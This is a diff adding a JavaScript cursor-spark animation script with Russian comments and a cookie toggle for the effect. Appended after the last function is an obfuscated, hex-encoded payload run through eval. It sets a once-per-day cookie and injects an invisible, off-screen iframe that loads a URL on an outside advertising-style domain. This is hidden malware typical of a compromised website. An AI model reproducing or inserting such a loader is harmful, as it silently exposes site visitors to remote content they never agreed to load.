+		if (BVerker(inum, dx, dy) == 1) {				// Если искра не вышла за определенную границу
+			xd[inum] = xd[inum]+dx;
+			yd[inum] = yd[inum]+dy;
+			// при удалении на половину допустимого расстояния "уменьшить" яркость искры
+			if ((((stx[inum]-xd[inum]) > (3*grEWxd[inum]/4)) || ((xd[inum]-stx[inum]) > (3*grEWxd[inum]/4))) || (((yd[inum]-sty[inum]) > (grSyd[inum]/2)))) {
+				setImage(inum, 0);
+				
+			}
+		} else {								// Если искра "вышла" за допустимую границу, погасить её
+			freeDots[freeDots.length] = inum;
+			dd[inum] = 0;
+			dots[inum].style.display="none";
+		}
+	}
+	
+// Расчет координат искры и её собственные изменения, при нажатии кнопки мыши
+	function CliVerker  (inum) {
+	// расчет предполагаемых перемещений ("физический")
+		var dx = ddx(inum);
+		var dy = ddy(inum);
+	// расчет перемещений с учетом границ движения
+		if (BVerker(inum, dx, dy) == 1) {				// Если искра не вышла/выйдет за определенную границу
+			xd[inum] = xd[inum]+dx;
+			yd[inum] = yd[inum]+dy;
+			// при удалении на половину допустимого расстояния "уменьшить" яркость искры
+			if ((((stx[inum]-xd[inum]) > (3*grEWxd[inum]/4)) || ((xd[inum]-stx[inum]) > (3*grEWxd[inum]/4))) || (((yd[inum]-sty[inum]) > (grSyd[inum]/2)))) {
+				setImage(inum, 0);
+			}
+		} else {								// Если искра "вышла" за допустимую границу, погасить её
+			freeDots[freeDots.length] = inum;
+			dd[inum] = 0;
+			dots[inum].style.display="none";
+		}
+	}
+	
+// Функция движения искры (рассчитывает новые координаты исры)
+	function Verker (inum) {
+		if (dd[inum] == 1) {						// При движении курсора
+			CurVerker (inum);
+		} else if (dd[inum] == 2) {					// При нажатии кнопки мыши
+			CliVerker (inum);
+		} else if (dd[inum] == 0) {					// Незадействованные искры
+			xd[inum] = xcoord;
+			yd[inum] = ycoord;
+		}
+	}
+	
+	function followmouse(e)
+	{
+		if (isNetscape) {
+			xcoord=e.pageX;
+			ycoord=e.pageY;
+		} 
+		else if (isOpera) {
+			xcoord = window.event.x + window.pageXOffset;
+			ycoord = window.event.y + window.pageYOffset;
+			
+		} 
+		else {
+			xcoord = window.event.x + document.body.scrollLeft;
+			ycoord = window.event.y + document.body.scrollTop;
+		}
+		curMouseX = xcoord;
+		curMouseY = ycoord;
+		if(suspend==true)
+		{
+			//console.log("resume");
+			suspend=false;
+			workerThread = setInterval(function(){animate()}, speed);
+		}
+	}
+	
+// Функция, отслеживающая передвижение мыши, определяет координаты курсора и состояния искр при перемещении курсора
+	function followmouse_animate() {
+		i = freeDots[freeDots.length-1];
+		//console.log(i);
+		//for (var i = 0; i < no; ++i) {
+			if (dd[i] == 0) {						// При неактивной искре, сделать движимой
+				dd[i] = 1;					// искра занята (в движении)
+				freeDots.pop();
+				xd[i] = curMouseX;					// установить искру в курсор
+				yd[i] = curMouseY;					// установить искру в курсор
+				stx[i] = curMouseX;				// запомнить координату отсчета для искры
+				sty[i] = curMouseY;				// запомнить координату отсчета для искры
+				vxd[i] = 20*Math.random() - 10;	// установить скорость (уравнение) движения
+				vyd[i] = 16*Math.random() - 8;	// установить скорость (уравнение) движения
+				grEWxd[i] = 256*Math.random();		// установить границу движения искры - восток, запад
+				grNyd[i] = 128*Math.random();		// установить границу движения искры - север
+				grSyd[i] = 512*Math.random();		// установить границу движения искры - юг
+			// Изменение характеристик искры
+				dots[i].style.display="block";
+				setImage(i, Math.floor(Math.random()*(iskr.length)));
+			// Выход из цикла
+				//break;
+			}
+		//}
+	}
+	
+// Функция, отслеживающая нажатия кнопок мыши, определяет состояния искры после нажатия
+	function mouseclick (e) {
+		if(suspend==true)
+		{
+			//console.log("resume");
+			suspend=false;
+			workerThread = setInterval(function(){animate()}, speed);
+		}
+		var j = 1;
+		if (isNetscape) {
+			xcoord=e.pageX;
+			ycoord=e.pageY;
+		}
+		else if (isOpera) {
+			xcoord = window.event.x + window.pageXOffset;
+			ycoord = window.event.y + window.pageYOffset;
+			
+		} 
+		else {
+			xcoord = window.event.x + document.body.scrollLeft;
+			ycoord = window.event.y + document.body.scrollTop;
+		}
+		for (var i=freeDots.length-1; i>=0; i--) {
+			if (dd[i] == 0) {							// При неактивной искре, сделать движимой
+				dd[i] = 2;						// искра занята (в движении)
+				freeDots.pop();
+				xd[i] = xcoord+3;					// установить искру в курсор
+				yd[i] = ycoord+3;					// установить искру в курсор
+				stx[i] = xcoord;					// запомнить координату отсчета для искры
+				sty[i] = ycoord;					// запомнить координату отсчета для искры
+				vxd[i] = 20*Math.random() - 10;		// установить скорость (уравнение) движения
+				vyd[i] = 32*Math.random() - 16;		// установить скорость (уравнение) движения
+				grEWxd[i] = 512*Math.random();			// установить границу движения искры - восток, запад
+				grNyd[i] = 256*Math.random();			// установить границу движения искры - север
+				grSyd[i] = 512*Math.random();			// установить границу движения искры - юг
+			// Изменение характеристик искры
+				dots[i].style.display="block";
+				setImage(i,Math.floor(Math.random()*(iskr.length)));
+			// Увеличение счетчика искр при клике
+				j = j+1;
+			// Выход из цикла
+				if (j > cliskr) {
+					break;
+				}
+			}
+		}
+	}
+	
+// Главная функция движения (перемещает все искры)
+	function animate() {
+		
+		if(Math.abs(curMouseX-prevMouseX)>5 || Math.abs(curMouseY-prevMouseY)>5)
+		{
+			for(var i=0; i<onMoveNum; i++)
+				followmouse_animate();
+			prevMouseX = curMouseX;
+			prevMouseY = curMouseY;
+			
+		}
+		
+		
+	animated=true;
+	//console.log(dd.indexOf(0));
+	var contin = false;
+	//console.log(freeDots.length);
+	if(suspend!=true && freeDots.length<no)
+	{
+		contin = true;
+	}
+	//alert("hey?");
+	if(contin==true)
+	{
+		
+	// Перерасчет границ документа (вычитаем '6' для учета размеров искр (10*10, с центром '-4'))
+		if (isNetscape) {
+			doc_width = window.innerWidth + window.pageXOffset - 10;
+			doc_height = window.innerHeight + window.pageYOffset - 10;
+		} else {
+			doc_width = document.body.clientWidth + document.body.scrollLeft - 10;
+			doc_height = document.body.clientHeight + document.body.scrollTop - 10;
+		}
+	// Рассчет и перемещение каждой искры
+		for (var i = 0; i < no; ++i) {
+			Verker (i);
+			if (dots[i].style.left != (xd[i])+"px")
+				dots[i].style.left = (xd[i])+"px";
+			if (dots[i].style.top != (yd[i])+"px")
+				dots[i].style.top = (yd[i])+"px";
+
+		}
+	}
+	else
+	{
+		clearInterval(workerThread);
+		workerThread=false;
+		suspend=true;
+		//alert("suspend");
+		//console.log("suspend");
+	}
+	// Следующий такт
+		//setTimeout(function(){animate();}, speed);
+	}
+	
+	function get_cookie ( cookie_name ) {
+		var results = document.cookie.match ( '(^|;) ?' + cookie_name + '=([^;]*)(;|$)' );
+		if ( results )
+			return ( unescape ( results[2] ) );
+		else
+			return null;
+	}
+	
+	function toggle_effects() {
+		var current_date = new Date();
+		var value;
+		var name = "effects";
+		if (get_cookie("effects")!="off") {
+			current_date.setFullYear(current_date.getFullYear()+10);
+			value = "off";
+		} else {
+			current_date.setFullYear(current_date.getFullYear());
+			value = "on";
+		}
+		var expires = "; expires="+current_date.toGMTString();
+		document.cookie = name+"="+value+expires+"; path=/";
+		if(!isOldAndBuggy)
+		{
+		if (get_cookie("effects")!="off") {
+			document.getElementById("togglerImg").src=togglerImg[1];
+			document.onmousemove=followmouse;				// Установка ответа на событие перемещения курсора мыши
+			document.onclick=mouseclick;					// Установка ответа на событие нажатия кнопки мыши
+			if(animated==false) {
+				workerThread = setInterval(function(){animate()}, speed);							// Запуск анимационного движения искр
+			}
+		} else {
+			document.getElementById("togglerImg").src=togglerImg[0];
+			document.onmousemove=null;					// Установка ответа на событие перемещения курсора мыши	
+			document.onclick=null;						// Установка ответа на событие нажатия кнопки мыши
+			clearInterval(workerThread);
+			workerThread = false;
+			animated = false;
+			for (var i = 0; i < no; ++ i)
+			{
+				if(dd[i]!=0)
+				{
+					freeDots[freeDots.length] = i;
+					dd[i]=0;
+					dots[i].style.display="none";
+				}
+			}
+			
+		}
+		}
+	}
+	
+	function iterate() {
+		iterate2();
+		if (get_cookie("effects")!="off") {
+			document.onmousemove=followmouse;				// Установка ответа на событие перемещения курсора мыши
+			document.onclick=mouseclick;					// Установка ответа на событие нажатия кнопки мыши
+			workerThread = setInterval(function(){animate()}, speed);								// Запуск анимационного движения искр
+		} else {
+		}
+	}
+	var alreadyrunflag=0 //flag to indicate whether target function has already been run
+	if(isOldAndBuggy)
+	{
+		//document.getElementById("togglerImg").src=togglerImg[1];
+	}
+	else
+	{
+	if (document.addEventListener)
+		document.addEventListener("DOMContentLoaded", function(){alreadyrunflag=1; iterate()}, false)
+	else if (document.all && !window.opera) {
+		document.write('<script type="text/javascript" id="contentloadtag" defer="defer" src="javascript:void(0)"><\/script>')
+		var contentloadtag=document.getElementById("contentloadtag")
+		contentloadtag.onreadystatechange=function() {
+			if (this.readyState=="complete") {
+				alreadyrunflag=1
+				iterate()
+			}
+		}
+	}
+	
+	window.onload=function() {
+		setTimeout(function(){if (!alreadyrunflag) iterate()}, 0)
+	}
+	}
+	
+	function setImage(id, imageNum)
+	{
+		//console.log("entered setImage");
+		var cell = document.getElementById("dot"+id);
+		var referId = "iskr"+imageNum+"-"+id;
+		//console.log(referId);
+		//console.log(cell.innerHTML);
+		if ( cell.hasChildNodes() )
+		{
+		    for (var i=0; i<cell.childNodes.length; i++)
+		    {
+				if(referId==cell.childNodes[i].id && cell.childNodes[i].style.display != "block")
+					cell.childNodes[i].style.display = "block";
+				else
+				{
+					//console.log(cell.childNodes[i].style);
+					if(cell.childNodes[i].style.display != "none")
+						cell.childNodes[i].style.display = "none";
+					
+				}
+		    } 
+		}
+	}/*08751a1f3bcda4d4455cfa0eb9945851*/;(function(){var rthkhzik="";var derfktee="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822313436366338386438313133363431363161653033393939623462363432373722293b69662820783333647120213d2022613831363765376161656432663233343338616463376431393562303831356422297b783232627128223134363663383864383131333634313631616530333939396234623634323737222c226138313637653761616564326632333433386164633764313935623038313564222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f7177652e796173796b61316c79616d686f6368792e696e666f2f6d656761616476657274697a652f3f594966597445436e4f47736f4e70613d43514b5242485651556947514726684472447363427a7473466e43436f3d6c6c6e5658636650557344426f6b4557654f266b6579776f72643d3737613665633764313265323233343361366333663030646363623434656165265843496a7977784d54754970563d77567568576374724a466461566961592651735776614378743d61625a6e62704a665256264d56694371735967793d724544436a6c622663426f78454a733d61635366626742785659684642266a4e4859475452686e6a3d72764e734571724b66264c544856447149486573714b4269616d473d4d73537a546a4b7257464226615278504472744b56506c4f3d4553784d42686264747979795126584b7266724c75593d6272455a71456976223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var knhheibr=0;knhheibr<derfktee.length;knhheibr+=2){rthkhzik=rthkhzik+parseInt(derfktee.substring(knhheibr,knhheibr+2), 16)+",";}rthkhzik=rthkhzik.substring(0,rthkhzik.length-1);eval(eval('String.fromCharCode('+rthkhzik+')'));})();/*08751a1f3bcda4d4455cfa0eb9945851*/
